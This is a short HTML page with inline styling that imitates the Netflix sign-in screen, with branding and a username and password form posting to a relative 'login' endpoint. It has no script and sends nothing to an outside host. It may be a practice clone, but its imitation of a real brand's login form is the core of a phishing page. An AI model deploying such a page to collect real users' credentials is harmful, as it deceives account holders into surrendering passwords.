<!DOCTYPE html>
<html>
<head>
    <title>Netflix Login</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial;
            text-align: center;
            margin-top: 100px;
        }
        .login-box {
            background-color: #111;
            padding: 30px;
            width: 300px;
            margin: auto;
            border-radius: 10px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px;
        }
        button {
            width: 95%;
            padding: 10px;
            background-color: red;
            color: white;
            border: none;
        }
        h1 {
            color: red;
        }
    </style>
</head>
<body>

<h1>NETFLIX</h1>

<div class="login-box">
    <form action="login" method="post">
        <input type="text" name="username" placeholder="Email or phone number" required />
        <input type="password" name="password" placeholder="Password" required />
        <button type="submit">Sign In</button>
    </form>
</div>

</body>
</html>
